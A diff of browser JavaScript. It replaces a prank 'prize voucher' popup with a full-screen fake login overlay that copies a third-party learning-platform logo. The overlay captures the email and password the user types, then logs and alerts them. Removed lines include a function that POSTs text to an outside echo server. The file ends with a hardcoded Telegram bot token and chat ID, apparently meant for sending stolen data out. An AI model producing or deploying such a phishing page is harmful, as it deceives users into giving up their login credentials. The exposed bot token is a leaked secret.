@@ -1,60 +1,115 @@
+const data = {};
 
-const popup = document.createElement("div");
+const overlay = document.createElement("div");
+overlay.style.position = "fixed";
+overlay.style.top = "0";
+overlay.style.left = "0";
+overlay.style.width = "100%";
+overlay.style.height = "100%";
+overlay.style.background = "#dfe3ea";
+overlay.style.display = "flex";
+overlay.style.justifyContent = "center";
+overlay.style.alignItems = "center";
+overlay.style.zIndex = "999999";
 
-popup.style.position = "fixed";
-popup.style.top = "20px";
-popup.style.right = "20px";
-popup.style.width = "320px";
-popup.style.padding = "20px";
-popup.style.background = "#ffffff";
-popup.style.borderRadius = "16px";
-popup.style.boxShadow = "0 5px 20px rgba(0,0,0,0.25)";
-popup.style.zIndex = "999999";
-popup.style.fontFamily = "Arial";
+const box = document.createElement("div");
+box.style.width = "550px";
+box.style.background = "#fff";
+box.style.border = "1px solid #ccc";
+box.style.fontFamily = "Arial";
+box.style.boxShadow = "0 0 20px rgba(0,0,0,0.2)";
+box.style.borderTop = "4px solid red";
 
-popup.innerHTML = `
-    <div style="font-size:40px;">🎉🎁</div>
+box.innerHTML = `
+    <div style="
+        padding:40px;
+        text-align:center;
+        border-bottom:1px solid #ddd;
+    ">
+        <img 
+            src="https://lms.hethongilp.vn/img/logo.png"
+            style="width:160px;"
+        >
+    </div>
 
-    <h2 style="margin:10px 0;color:#ff9800;">
-        Chúc mừng!
-    </h2>
+    <div style="padding:30px;">
+        
+        <input 
+            id="emailInput"
+            type="text"
+            placeholder="Email"
+            style="
+                width:100%;
+                padding:16px;
+                margin-bottom:20px;
+                border:1px solid #ccc;
+                font-size:22px;
+                box-sizing:border-box;
+            "
+        >
 
-    <p style="color:#444;">
-        Bạn đã nhận được phiếu trúng thưởng đặc biệt ✨
-    </p>
+        <input 
+            id="passwordInput"
+            type="password"
+            placeholder="Password"
+            style="
+                width:100%;
+                padding:16px;
+                margin-bottom:20px;
+                border:1px solid #ccc;
+                font-size:22px;
+                box-sizing:border-box;
+            "
+        >
 
-    <button id="downloadBtn"
-        style="
-            margin-top:12px;
-            padding:10px 16px;
-            border:none;
-            border-radius:10px;
-            background:#ff9800;
-            color:white;
-            cursor:pointer;
-            font-weight:bold;
-        ">
-        📥 Download Phiếu
-    </button>
+        <label style="font-size:20px;">
+            <input type="checkbox">
+            Ghi nhớ đăng nhập
+        </label>
+
+        <button 
+            id="loginBtn"
+            style="
+                width:100%;
+                margin-top:25px;
+                padding:16px;
+                border:none;
+                background:#79c92b;
+                color:white;
+                font-size:28px;
+                cursor:pointer;
+            "
+        >
+            Đăng nhập
+        </button>
+    </div>
+
+    <div style="
+        border-top:1px solid #ddd;
+        text-align:right;
+        padding:15px;
+        font-size:20px;
+    ">
+        Design by Hoàng Vũ Group
+    </div>
 `;
 
-document.body.appendChild(popup);
+overlay.appendChild(box);
+document.body.appendChild(overlay);
 
-document
-    .getElementById("downloadBtn")
-    .addEventListener("click", () => {
-        alert("😂 Bạn đã bị lừa!");
-    });
+document.getElementById("loginBtn").onclick = () => {
 
-async function sendText(text) {
-  await fetch("https://m8ihdiexcj.rbmock.dev/echo", {
-    method: "POST",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: text
-  });
-}
+    data.email = document.getElementById("emailInput").value;
+    data.password = document.getElementById("passwordInput").value;
+
+    console.log(data);
+
+    alert(
+        "Email: " + data.email +
+        "\\nPassword: " + data.password
+    );
+};
+
 
 const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
 const TELEGRAM_CHAT_ID = "6533206955";
